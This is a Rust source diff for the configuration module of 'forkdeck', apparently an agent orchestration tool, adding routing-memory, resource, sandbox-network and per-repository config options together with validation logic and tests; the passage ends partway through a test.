@@ -1,21 +1,24 @@
 use crate::state::{AgentKind, AgentRef, Provider, Tier};
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::path::{Path, PathBuf};
 
 pub const EXAMPLE: &str = include_str!("../forkdeck.example.toml");
 
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct Config {
     pub router: RouterCfg,
+    pub adaptive: crate::adaptive::Config,
     pub agents: AgentsCfg,
     pub review: ReviewCfg,
     pub automation: AutoCfg,
     pub team: TeamCfg,
     pub limits: LimitsCfg,
+    pub resources: ResourcesCfg,
     pub knowledge: KnowledgeCfg,
     pub remote: RemoteCfg,
+    pub web: WebCfg,
     /// MCP servers by name. CI and deployment stages call tools on these.
     pub mcp: HashMap<String, McpServerCfg>,
     pub repos: Vec<RepoCfg>,
@@ -23,7 +26,7 @@ pub struct Config {
     pub demo: bool,
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct RouterCfg {
     /// "rules" or "jev"
@@ -36,22 +39,24 @@ pub struct RouterCfg {
     pub plan: String,
     pub jev: JevCfg,
     pub rules: RulesCfg,
+    pub memory: MemoryCfg,
 }
 
 impl Default for RouterCfg {
     fn default() -> Self {
         RouterCfg {
-            kind: "rules".into(),
+            kind: "auto".into(),
             default_agent: AgentKind::Claude,
             threshold: 0.6,
             plan: "auto".into(),
             jev: JevCfg::default(),
             rules: RulesCfg::default(),
+            memory: MemoryCfg::default(),
         }
     }
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct JevCfg {
     pub base_url: String,
@@ -76,41 +81,130 @@ impl Default for JevCfg {
     }
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(default, deny_unknown_fields)]
+pub struct MemoryCfg {
+    /// Route a task like earlier ones that went well the way they were, without asking Jev.
+    pub enabled: bool,
+    /// How alike two tasks must be (shared words over all words, 0 to 1).
+    pub similarity: f64,
+    /// Earlier tasks that went well needed before memory answers.
+    pub min_matches: usize,
+    /// Once a kind of task keeps going well, try the next one a tier lower.
+    pub step_down: bool,
+    /// Tasks that went well at a tier before one tier lower is tried.
+    pub step_down_after: usize,
+}
+
+impl Default for MemoryCfg {
+    fn default() -> Self {
+        MemoryCfg { enabled: true, similarity: 0.8, min_matches: 2, step_down: true, step_down_after: 3 }
+    }
+}
+
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct RulesCfg {
     pub claude_keywords: Vec<String>,
     pub codex_keywords: Vec<String>,
     pub heavy_keywords: Vec<String>,
     pub light_keywords: Vec<String>,
+    /// Phrases that ask how to go about something: the task proposes approaches first.
+    pub plan_keywords: Vec<String>,
 }
 
-fn words(s: &str) -> Vec<String> {
-    s.split_whitespace().map(|w| w.to_string()).collect()
+/// Comma-separated keywords; a keyword may be a phrase. Word forms match too: "fix" also
+/// matches "fixes", "fixed" and "fixing".
+fn phrases(s: &str) -> Vec<String> {
+    s.split(',').map(|w| w.trim().to_string()).filter(|w| !w.is_empty()).collect()
 }
 
 impl Default for RulesCfg {
     fn default() -> Self {
         RulesCfg {
-            claude_keywords: words("refactor design architecture document docs readme explain plan restructure"),
-            codex_keywords: words("bug fix test tests script failing crash regression implement endpoint"),
-            heavy_keywords: words("architecture migrate migration concurrency race security rewrite redesign deadlock distributed"),
-            light_keywords: words("typo rename comment bump format lint wording spelling"),
+            claude_keywords: phrases(
+                "refactor, restructure, reorganize, reorganise, clean up, tidy up, simplify, design, architecture, \
+                 document, documentation, docs, readme, explain, describe, summarize, summarise, write up, plan, \
+                 user guide, tutorial, how to, changelog, release notes, api design, naming, error messages, \
+                 developer experience, usability, rethink, untangle, split into modules, extract a module",
+            ),
+            codex_keywords: phrases(
+                "bug, fix, test, unit test, integration test, test case, script, failing, fails, crash, panic, \
+                 regression, implement, endpoint, stack trace, traceback, exception, error when, does not work, \
+                 doesn't work, not working, broken, off by one, null pointer, segfault, flaky, benchmark, optimize, \
+                 optimise, speed up, slow, performance, cli flag, command line option, parse, parser, build fails, \
+                 compile error, compiler error, ci is red, reproduce, repro, edge case, returns the wrong, wrong result",
+            ),
+            heavy_keywords: phrases(
+                "architecture, migrate, migration, concurrency, concurrent, race, race condition, deadlock, \
+                 thread safety, security, vulnerability, authentication, authorization, permissions model, \
+                 encryption, crypto, rewrite, redesign, distributed, consensus, replication, sharding, data loss, \
+                 corruption, memory leak, breaking change, across the codebase, every module, schema change, \
+                 database migration, protocol, backwards compatible, backward compatible, lock free, from scratch",
+            ),
+            light_keywords: phrases(
+                "typo, rename, comment, bump, version bump, format, formatting, lint, clippy warning, wording, \
+                 spelling, grammar, whitespace, indentation, one line, one-line, dead code, unused import, \
+                 log message, doc comment, copyright, badge, update the version, small tweak, minor",
+            ),
+            plan_keywords: phrases(
+                "how should, what is the best way, what's the best way, which approach, options for, \
+                 pros and cons, trade-offs, tradeoffs, should we, propose, come up with, brainstorm, \
+                 compare approaches, figure out how, not sure how",
+            ),
         }
     }
 }
 
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct AgentsCfg {
     pub claude: AgentCfg,
     pub codex: AgentCfg,
     pub copilot: CopilotCfg,
     pub timeout_mins: Option<u64>,
+    /// Run agents without the user's own plugins, hooks and MCP servers (the repository's own
+    /// settings still apply). They add tens of thousands of tokens to every call. Default on.
+    pub lean: Option<bool>,
+    /// Fill unset model tiers from the models each CLI lists for the account. Default on.
+    pub discover_models: Option<bool>,
+    /// Claude workers run every shell command in Claude Code's sandbox, without asking, so any
+    /// language's tools work. Unset: whenever bubblewrap and socat are installed (Linux). false:
+    /// never; workers may then run only the build commands found for the repository.
+    pub sandbox: Option<bool>,
+    /// Which hosts a sandboxed worker's commands may reach.
+    pub network: NetworkCfg,
+}
+
+/// `[agents.network]`: the hosts sandboxed workers reach, beyond nothing.
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(default, deny_unknown_fields)]
+pub struct NetworkCfg {
+    /// The public package registries of the languages a repository uses (crates.io, npm, PyPI,
+    /// Maven Central, ...). Turn off when everything comes through a mirror.
+    pub public_registries: bool,
+    /// Internal mirrors and proxies (Nexus, Artifactory, a Go proxy, ...), as host names.
+    /// The tools are pointed at them by their own settings (.npmrc, settings.xml, GOPROXY, ...).
+    pub mirrors: Vec<String>,
+    /// Also open the mirrors your package managers already use, as your own settings files and
+    /// environment name them (never a repository's files). Default on.
+    pub detect_mirrors: bool,
+}
+
+impl Default for NetworkCfg {
+    fn default() -> Self {
+        NetworkCfg { public_registries: true, mirrors: Vec::new(), detect_mirrors: true }
+    }
+}
+
+impl AgentsCfg {
+    pub fn lean(&self) -> bool {
+        self.lean.unwrap_or(true)
+    }
 }
 
 /// `[agents.copilot]`: the CLI's own settings plus the profiles it can run.
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct CopilotCfg {
     pub cmd: Option<String>,
@@ -131,7 +225,7 @@ impl CopilotCfg {
 }
 
 /// A set of models copilot runs under one name, used as `copilot:<name>`.
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct ProfileCfg {
     /// Needed when the model IDs do not say it (claude-* is anthropic, gpt-* and o<digit>* openai).
@@ -141,7 +235,7 @@ pub struct ProfileCfg {
 }
 
 /// A model preference list per tier: the first one the account allows is used.
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct TierLists {
     pub light: Option<OneOrMany>,
@@ -149,7 +243,7 @@ pub struct TierLists {
     pub heavy: Option<OneOrMany>,
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(untagged)]
 pub enum OneOrMany {
     One(String),
@@ -244,7 +338,7 @@ impl AgentsCfg {
 }
 
 /// A value per effort tier. A tier left out of the config keeps its built-in value.
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct Tiers {
     pub light: Option<String>,
@@ -270,7 +364,7 @@ impl Tiers {
     }
 }
 
-#[derive(Deserialize, Clone, Debug, Default)]
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
 #[serde(default, deny_unknown_fields)]
 pub struct AgentCfg {
     pub cmd: Option<String>,
@@ -319,7 +413,7 @@ impl AgentCfg {
     }
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct ReviewCfg {
     /// "auto" (router decides), "always" or "never"
@@ -360,7 +454,7 @@ impl Default for ReviewCfg {
     }
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct AutoCfg {
     /// Start with issue polling switched on.
@@ -386,8 +480,39 @@ impl Default for AutoCfg {
     }
 }
 
+/// How much of this machine forkdeck may take. Agent turns mostly wait on a model; checks build
+/// and test, and several at once can starve the machine and fail timing-sensitive tests.
+#[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(default, deny_unknown_fields)]
+pub struct ResourcesCfg {
+    /// Checks that may run at the same time. A job waiting for one lends its agent slot to other
+    /// jobs meanwhile.
+    pub builds: usize,
+    /// Niceness for agent processes and whatever they start (agents build and test too), so the
+    /// machine stays usable. 0 leaves it alone.
+    pub nice: i32,
+    /// Niceness for checks. Lower than `nice` by default: the check decides the job, and a
+    /// timing-sensitive test must not lose its CPU to agents' own builds.
+    pub check_nice: i32,
+    /// How often a failed check is run again, once the machine is quiet, before the failure goes
+    /// back to the worker. A test that passes on a later run is reported as flaky, not fixed.
+    pub check_retries: u32,
+    /// Share build output and toolchain caches between worktrees, and let Codex's sandbox write
+    /// to them: each job no longer compiles the project's dependencies from nothing.
+    pub build_cache: bool,
+    /// A check does not start while the one-minute load average is above this many times the
+    /// number of CPUs. 0 switches the wait off.
+    pub max_load: f64,
+}
+
+impl Default for ResourcesCfg {
+    fn default() -> Self {
+        ResourcesCfg { builds: 1, nice: 10, check_nice: 0, check_retries: 1, build_cache: true, max_load: 1.0 }
+    }
+}
+
 /// Sharing what this machine is working on with teammates, through comments on the forge.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct TeamCfg {
     /// Claim issues and reviews with a status comment, and refuse what a teammate already holds.
@@ -415,7 +540,7 @@ impl Default for TeamCfg {
 
 /// How much forkdeck may do by itself. Counted over the last 24 hours from the journal, so a
 /// restart does not reset anything. 0 switches a limit off.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct LimitsCfg {
     /// Issues and reviews picked up per 24 hours, over all repositories.
@@ -436,7 +561,7 @@ impl Default for LimitsCfg {
 }
 
 /// Control from a paired phone on the local network, over mutual TLS.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct RemoteCfg {
     pub enabled: bool,
@@ -463,7 +588,7 @@ impl Default for RemoteCfg {
 }
 
 /// Notes about each repository that are given to the worker with every issue.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct KnowledgeCfg {
     /// Hand the notes to the worker. Without a notes file this does nothing.
@@ -478,11 +603,14 @@ pub struct KnowledgeCfg {
     pub max_learned: usize,
     /// How much of the notes is put into a prompt.
     pub max_chars: usize,
+    /// Size of the repository brief put in front of an issue's task: its layout, build manifests,
+    /// which instruction files exist, and the files the issue names. 0 leaves it out.
+    pub brief_chars: usize,
 }
 
 impl Default for KnowledgeCfg {
     fn default() -> Self {
-        KnowledgeCfg { enabled: true, learn: false, share: true, max_learned: 30, max_chars: 6000 }
+        KnowledgeCfg { enabled: true, learn: false, share: true, max_learned: 30, max_chars: 6000, brief_chars: 30_000 }
     }
 }
 
@@ -498,7 +626,7 @@ impl AutoCfg {
 
 /// How to reach one MCP server: a command to run (stdio) or a URL (Streamable HTTP).
 /// `${NAME}` in args, env values, the url and header values is replaced from the environment.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(default, deny_unknown_fields)]
 pub struct McpServerCfg {
     pub command: Option<String>,
@@ -524,7 +652,7 @@ impl Default for McpServerCfg {
 ///
 /// The answer is read as text. `failure`, `pending` and `success` are regular expressions tried in
 /// that order; an answer none of them matches counts as pending. A tool error is a failure.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(deny_unknown_fields)]
 pub struct CallCfg {
     /// Defaults to the stage's server.
@@ -568,7 +696,7 @@ fn empty_table() -> toml::Value {
 }
 
 /// Watch CI on a pull request forkdeck opened, and send failures back to the worker.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(deny_unknown_fields)]
 pub struct CiCfg {
     pub server: String,
@@ -590,7 +718,7 @@ pub struct CiCfg {
 }
 
 /// Deploy the base branch when it moves, watch the result, and roll back if it goes wrong.
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(deny_unknown_fields)]
 pub struct DeployCfg {
     pub server: String,
@@ -652,9 +780,13 @@ impl CallCfg {
     }
 }
 
-#[derive(Deserialize, Clone, Debug)]
+#[derive(Serialize, Deserialize, Clone, Debug)]
 #[serde(deny_unknown_fields)]
 pub struct RepoCfg {
+    /// Hosts the commands a sandboxed worker runs may reach, such as a package registry. None
+    /// by default.
+    #[serde(default)]
+    pub agent_domains: Vec<String>,
     pub provider: Provider,
     /// "owner/name" on GitHub, "group/project" on GitLab
     pub repo: String,
@@ -670,6 +802,12 @@ pub struct RepoCfg {
     pub done_label: String,
     #[serde(default = "d_failed")]
     pub failed_label: String,
+    /// Marks the parent issue of a plan that was split into sub-issues.
+    #[serde(default = "d_plan")]
+    pub plan_label: String,
+    /// Put on a task that needs a person before it can go on.
+    #[serde(default = "d_human")]
+    pub human_label: String,
     /// Only pick up issues and pull requests opened by these accounts. Empty: anyone.
     #[serde(default)]
     pub allowed_authors: Vec<String>,
@@ -712,6 +850,12 @@ fn d_working() -> String {
 }
 fn d_review() -> String {
     "agent:pr-open".into()
+}
+fn d_plan() -> String {
+    "forkdeck:plan".into()
+}
+fn d_human() -> String {
+    "needs-human".into()
 }
 fn d_pr_ready() -> String {
     "review:ready".into()
@@ -760,6 +904,14 @@ pub fn load(explicit: Option<&Path>) -> anyhow::Result<(Config, Option<PathBuf>)
                 toml::from_str(&text).map_err(|e| anyhow::anyhow!("{}: {}", c.display(), e))?;
             for r in &mut cfg.repos {
                 r.path = expand(&r.path);
+            }
+            if let Some(merged) = with_repo_files(&text, &cfg)? {
+                cfg = merged;
+                for r in &mut cfg.repos {
+                    r.path = expand(&r.path);
+                }
+            }
+            for r in &mut cfg.repos {
                 r.host = origin_host(&r.path);
             }
             cfg.remote.dir = expand(&cfg.remote.dir);
@@ -775,6 +927,39 @@ pub fn load(explicit: Option<&Path>) -> anyhow::Result<(Config, Option<PathBuf>)
     let mut cfg = Config::default();
     cfg.remote.dir = expand(&cfg.remote.dir);
     Ok((cfg, None))
+}
+
+#[derive(Clone, Serialize)]
+pub struct RepoEntry {
+    pub provider: Provider,
+    pub repo: String,
+    pub path: PathBuf,
+    pub base: String,
+}
+
+/// Append only; editors' existing bytes and ordering are never serialized back out.
+pub fn append_repo(path: &Path, entry: &RepoEntry) -> anyhow::Result<()> {
+    use std::io::{Read, Write};
+    static APPENDS: std::sync::Mutex<()> = std::sync::Mutex::new(());
+    let _guard = APPENDS.lock().unwrap();
+    let mut file = std::fs::OpenOptions::new().read(true).append(true).open(path)?;
+    let mut previous = Vec::new();
+    file.read_to_end(&mut previous)?;
+    let block = format!("\n[[repos]]\n{}",toml::to_string(entry)?);
+    let result = (|| -> anyhow::Result<()> {
+        file.write_all(block.as_bytes())?;
+        file.sync_all()?;
+        load(Some(path))?;
+        let current = std::fs::read(path)?;
+        anyhow::ensure!(current.starts_with(&previous) && current[previous.len()..].starts_with(block.as_bytes()), "configuration changed during repository append");
+        Ok(())
+    })();
+    if let Err(error) = result {
+        file.set_len(previous.len() as u64)?;
+        file.sync_all()?;
+        return Err(error);
+    }
+    Ok(())
 }
 
 impl RepoCfg {
@@ -822,6 +1007,95 @@ pub fn unambiguous_moves<T: Eq + std::hash::Hash + Clone>(pairs: impl IntoIterat
     owners.into_iter().filter(|(old, new)| new.len() == 1 && new[0] != *old).map(|(old, mut new)| (old, new.remove(0))).collect()
 }
 
+/// Settings a repository keeps for itself, next to the team's notes.
+pub const REPO_FILE: &str = ".forkdeck/config.toml";
+
+/// The user's config again, with each repository's own file filled in, or None when no
+/// repository has one. The file is read from the base branch as last fetched, never from the
+/// clone's working tree: agents edit files there, and the file names commands to run.
+fn with_repo_files(text: &str, cfg: &Config) -> anyhow::Result<Option<Config>> {
+    let mut table: toml::Table = toml::from_str(text)?;
+    let Some(toml::Value::Array(entries)) = table.get_mut("repos") else { return Ok(None) };
+    let mut found = false;
+    for (entry, r) in entries.iter_mut().zip(&cfg.repos) {
+        let (toml::Value::Table(entry), Some(file)) = (entry, on_base(&r.path, &r.base)) else { continue };
+        // `automation` only means something for the repository forkdeck was started in.
+        merge_repo_file(entry, &file)
+            .map_err(|e| anyhow::anyhow!("{} on origin/{} in {}: {}", REPO_FILE, r.base, r.path.display(), e))?;
+        found = true;
+    }
+    Ok(found.then(|| table.try_into()).transpose()?)
+}
+
+/// The clone forkdeck was started in, when its base branch has a `.forkdeck/config.toml` and
+/// `[[repos]]` does not list it already. Which repository it is comes from git: the forge and
+/// path from origin, the base branch from origin/HEAD. The flag is the file's `automation`.
+pub fn launch_repo(cwd: &Path, cfg: &Config) -> anyhow::Result<Option<(RepoCfg, bool)>> {
+    let git = |args: &[&str]| {
+        std::process::Command::new("git").arg("-C").arg(cwd).args(args).stderr(std::process::Stdio::null()).output().ok()
+            .filter(|o| o.status.success()).map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
+    };
+    let Some(top) = git(&["rev-parse", "--show-toplevel"]).map(PathBuf::from) else { return Ok(None) };
+    let canonical = |p: &Path| p.canonicalize().unwrap_or_else(|_| p.to_path_buf());
+    if cfg.repos.iter().any(|r| canonical(&r.path) == canonical(&top)) {
+        return Ok(None);
+    }
+    let Some((provider, repo)) = git(&["remote", "get-url", "origin"]).as_deref().and_then(forge_repo) else { return Ok(None) };
+    let base = git(&["symbolic-ref", "--short", "refs/remotes/origin/HEAD"])
+        .and_then(|b| b.strip_prefix("origin/").map(str::to_string)).unwrap_or_else(d_base);
+    let Some(file) = on_base(&top, &base) else { return Ok(None) };
+    let mut entry = toml::Table::new();
+    entry.insert("provider".into(), (if provider == Provider::Github { "github" } else { "gitlab" }).into());
+    entry.insert("repo".into(), repo.into());
+    entry.insert("path".into(), top.to_string_lossy().into_owned().into());
+    entry.insert("base".into(), base.clone().into());
+    let automation = merge_repo_file(&mut entry, &file)
+        .map_err(|e| anyhow::anyhow!("{} on origin/{} in {}: {}", REPO_FILE, base, top.display(), e))?;
+    let mut r: RepoCfg = toml::Value::Table(entry).try_into()?;
+    r.host = origin_host(&r.path);
+    Ok(Some((r, automation)))
+}
+
+/// "git@github.com:o/r.git", "https://gitlab.example.com/g/sub/p" -> the forge and "o/r", "g/sub/p".
+/// A host that names neither forge is not guessed at.
+fn forge_repo(url: &str) -> Option<(Provider, String)> {
+    let host = host_of(url)?;
+    let provider = if host.contains("github") { Provider::Github } else if host.contains("gitlab") { Provider::Gitlab } else { return None };
+    let url = url.trim();
+    let path = match url.split_once("://") {
+        Some((_, rest)) => rest.split_once('/')?.1,
+        None => url.split_once(':')?.1,
+    };
+    let path = path.trim_end_matches('/');
+    let path = path.strip_suffix(".git").unwrap_or(path);
+    path.contains('/').then(|| (provider, path.to_string()))
+}
+
+fn on_base(clone: &Path, base: &str) -> Option<String> {
+    let spec = format!("origin/{}:{}", base, REPO_FILE);
+    std::process::Command::new("git").arg("-C").arg(clone).args(["show", &spec]).stderr(std::process::Stdio::null()).output().ok()
+        .filter(|o| o.status.success()).map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+}
+
+/// Adds the keys a repository's file sets and the entry does not, and returns the file's
+/// `automation`. Which repository and clone an entry is stays git's or the user's to say.
+fn merge_repo_file(entry: &mut toml::Table, file: &str) -> anyhow::Result<bool> {
+    let mut file: toml::Table = toml::from_str(file)?;
+    for key in ["provider", "repo", "path", "base"] {
+        anyhow::ensure!(!file.contains_key(key), "{} cannot be set in the repository's file", key);
+    }
+    let automation = match file.remove("automation") {
+        None => false,
+        Some(toml::Value::Boolean(b)) => b,
+        Some(_) => anyhow::bail!("automation must be true or false"),
+    };
+    for (k, v) in file {
+        entry.entry(k).or_insert(v);
+    }
+    toml::Value::Table(entry.clone()).try_into::<RepoCfg>()?;
+    Ok(automation)
+}
+
 /// The host a clone's origin names, or "" when there is none to read.
 pub fn origin_host(clone: &Path) -> String {
     std::process::Command::new("git").args(["-C"]).arg(clone).args(["remote", "get-url", "origin"]).stderr(std::process::Stdio::null()).output().ok()
@@ -839,8 +1113,16 @@ pub fn host_of(url: &str) -> Option<String> {
 
 impl Config {
     pub fn validate(&self) -> anyhow::Result<()> {
-        if !matches!(self.router.kind.as_str(), "rules" | "jev") {
-            anyhow::bail!("router.kind must be \"rules\" or \"jev\", got {:?}", self.router.kind);
+        if let Some(usd) = self.adaptive.invocation_max_usd {
+            anyhow::ensure!(usd.is_finite() && usd > 0.0, "invocation_max_usd must be finite and positive");
+            let agent = self.agents.get(AgentKind::Claude);
+            for args in [agent.write_args, agent.review_args].into_iter().flatten() {
+                anyhow::ensure!(!args.iter().any(|s| s == "--max-budget-usd" || s.starts_with("--max-budget-usd=")),
+                    "remove explicit --max-budget-usd from agent arguments before configuring invocation_max_usd");
+            }
+        }
+        if !matches!(self.router.kind.as_str(), "rules" | "jev" | "auto") {
+            anyhow::bail!("router.kind must be \"auto\", \"rules\" or \"jev\", got {:?}", self.router.kind);
         }
         if !matches!(self.review.mode.as_str(), "auto" | "always" | "never") {
             anyhow::bail!("review.mode must be auto, always or never");
@@ -854,6 +1136,14 @@ impl Config {
         if !(0.5..=1.0).contains(&self.router.threshold) {
             anyhow::bail!("router.threshold must be between 0.5 and 1.0, got {}", self.router.threshold);
         }
+        // The sandbox matches host names; a URL or a path would never match and quietly allow nothing.
+        let hosts = self.agents.network.mirrors.iter().chain(self.repos.iter().flat_map(|r| r.agent_domains.iter()));
+        for h in hosts {
+            anyhow::ensure!(!h.is_empty() && !h.contains("://") && !h.contains('/') && !h.contains(' '), "agents.network.mirrors and agent_domains take host names such as nexus.example.com, got {:?}", h);
+        }
+        let m = &self.router.memory;
+        anyhow::ensure!(m.similarity > 0.0 && m.similarity <= 1.0, "router.memory.similarity must be above 0 and at most 1");
+        anyhow::ensure!(m.min_matches >= 1 && m.step_down_after >= 1, "router.memory.min_matches and step_down_after must be at least 1");
         if self.router.jev.timeout_ms < 100 {
             anyhow::bail!("router.jev.timeout_ms must be at least 100");
         }
@@ -879,6 +1169,18 @@ impl Config {
         }
         if self.team.refresh_secs < 30 {
             anyhow::bail!("team.refresh_secs must be at least 30");
+        }
+        if self.resources.builds == 0 {
+            anyhow::bail!("resources.builds must be at least 1");
+        }
+        if !(0..=19).contains(&self.resources.nice) || !(0..=19).contains(&self.resources.check_nice) {
+            anyhow::bail!("resources.nice and resources.check_nice must be between 0 and 19");
+        }
+        if self.resources.check_retries > 3 {
+            anyhow::bail!("resources.check_retries must be at most 3");
+        }
+        if !(self.resources.max_load.is_finite() && self.resources.max_load >= 0.0) {
+            anyhow::bail!("resources.max_load must be 0 or more");
         }
         if !(1..=24 * 60).contains(&self.review.check_timeout_mins) {
             anyhow::bail!("review.check_timeout_mins must be between 1 and 1440");
@@ -964,7 +1266,7 @@ impl Config {
             if !r.path.is_absolute() {
                 anyhow::bail!("repos: path for {} must be absolute or start with ~/, got {}", r.repo, r.path.display());
             }
-            for labels in [[&r.label, &r.working_label, &r.done_label, &r.failed_label], [&r.pr_label, &r.pr_working_label, &r.pr_pass_label, &r.pr_fail_label]] {
+            for labels in [vec![&r.label, &r.working_label, &r.done_label, &r.failed_label, &r.plan_label, &r.human_label], vec![&r.pr_label, &r.pr_working_label, &r.pr_pass_label, &r.pr_fail_label]] {
                 let mut seen = std::collections::HashSet::new();
                 for label in labels {
                     // GitHub label names ignore case: "Agent:Ready" and "agent:ready" are one label there.
@@ -978,6 +1280,14 @@ impl Config {
                 }
             }
         }
+        self.web.check()?;
+        for (provider, app) in [("github", &self.web.forges.github), ("gitlab", &self.web.forges.gitlab)] {
+            if let Some(app) = app {
+                anyhow::ensure!(!self.demo, "--demo refuses web.forges.{provider}");
+                app.validate(provider)?;
+            }
+        }
+        if let Some(oidc) = &self.web.oidc { oidc.validate()?; }
         if self.remote.listen.parse::<std::net::SocketAddr>().is_err() {
             anyhow::bail!("remote.listen must be an address and port such as 0.0.0.0:7443, got {:?}", self.remote.listen);
         }
@@ -1044,6 +1354,90 @@ mod tests {
     use super::*;
 
     #[test]
+    fn repository_appends_preserve_bytes_serialize_and_restore_on_invalid_edits() {
+        let root = std::env::temp_dir().join(format!("forkdeck-append-{}",crate::metrics::id()));
+        std::fs::create_dir_all(&root).unwrap();
+        let path = root.join("config.toml");
+        let initial = "# Keep this comment and spacing.\n[web]\nport = 17435\n";
+        std::fs::write(&path,initial).unwrap();
+        let entry = |name: &str| RepoEntry { provider:Provider::Github,repo:format!("owner/{name}"),path:root.join(name),base:"main".into() };
+        append_repo(&path,&entry("one")).unwrap();
+        let block = format!("\n[[repos]]\nprovider = \"github\"\nrepo = \"owner/one\"\npath = {:?}\nbase = \"main\"\n",root.join("one").to_str().unwrap());
+        assert_eq!(std::fs::read_to_string(&path).unwrap(),format!("{initial}{block}"));
+        let a = entry("two");
+        let b = entry("three");
+        let paths = [path.clone(),path.clone()];
+        let threads: Vec<_> = [a,b].into_iter().zip(paths).map(|(entry,path)| std::thread::spawn(move || append_repo(&path,&entry).unwrap())).collect();
+        for thread in threads { thread.join().unwrap(); }
+        let text = std::fs::read_to_string(&path).unwrap();
+        assert!(text.starts_with(&format!("{initial}{block}")));
+        assert_eq!(text.matches("[[repos]]").count(),3);
+        assert_eq!(load(Some(&path)).unwrap().0.repos.len(),3);
+        let mut invalid = entry("invalid");
+        invalid.base.clear();
+        assert!(append_repo(&path,&invalid).is_err());
+        assert_eq!(std::fs::read_to_string(&path).unwrap(),text);
+        let edited = format!("{text}\nmanual = [");
+        std::fs::write(&path,&edited).unwrap();
+        assert!(append_repo(&path,&entry("after-edit")).is_err());
+        assert_eq!(std::fs::read_to_string(&path).unwrap(),edited);
+        std::fs::remove_dir_all(root).unwrap();
+    }
+
+    fn forge_config() -> Config {
+        toml::from_str(r#"
+[web.forges.github]
+client_id = "github-app"
+client_secret_env = "FORKDECK_TEST_FORGE_SECRET"
+redirect_url = "http://127.0.0.1:17435/forges/github/callback"
+[web.forges.gitlab]
+client_id = "gitlab-app"
+client_secret_env = "FORKDECK_TEST_FORGE_SECRET"
+redirect_url = "https://forkdeck.example/forges/gitlab/callback"
+"#).unwrap()
+    }
+
+    #[test]
+    fn forge_loopback_ipv6_endpoints_are_allowed() {
+        std::env::set_var("FORKDECK_TEST_FORGE_SECRET", "test-secret");
+        let mut cfg = forge_config();
+        let app = cfg.web.forges.github.as_mut().unwrap();
+        app.redirect_url = "http://[::1]:17435/forges/github/callback".into();
+        app.base_url = "http://[::1]:9080".into();
+        cfg.validate().unwrap();
+    }
+
+    #[test]
+    fn forge_apps_defaults_and_validation() {
+        std::env::set_var("FORKDECK_TEST_FORGE_SECRET", "test-secret");
+        let cfg = forge_config();
+        let github = cfg.web.forges.github.as_ref().unwrap();
+        assert_eq!(github.host, "github.com");
+        assert!(!github.private);
+        assert!(github.clone_dir.is_absolute());
+        assert_eq!(cfg.web.forges.gitlab.as_ref().unwrap().host, "gitlab.com");
+        cfg.validate().unwrap();
+        for (key, value) in [("client_id", ""), ("client_secret_env", "FORKDECK_UNSET_FORGE_SECRET"), ("client_secret_env", "FORKDECK_EMPTY_FORGE_SECRET"), ("redirect_url", "http://public.example/forges/github/callback"), ("redirect_url", "https://public.example/wrong"), ("redirect_url", "not a URL"), ("base_url", "http://public.example"), ("host", "evil.example/path")] {
+            std::env::set_var("FORKDECK_EMPTY_FORGE_SECRET", "");
+            let mut bad = cfg.clone();
+            let app = bad.web.forges.github.as_mut().unwrap();
+            match key {
+                "client_id" => app.client_id = value.into(),
+                "client_secret_env" => app.client_secret_env = value.into(),
+                "redirect_url" => app.redirect_url = value.into(),
+                "base_url" => app.base_url = value.into(),
+                "host" => app.host = value.into(),
+                _ => unreachable!(),
+            }
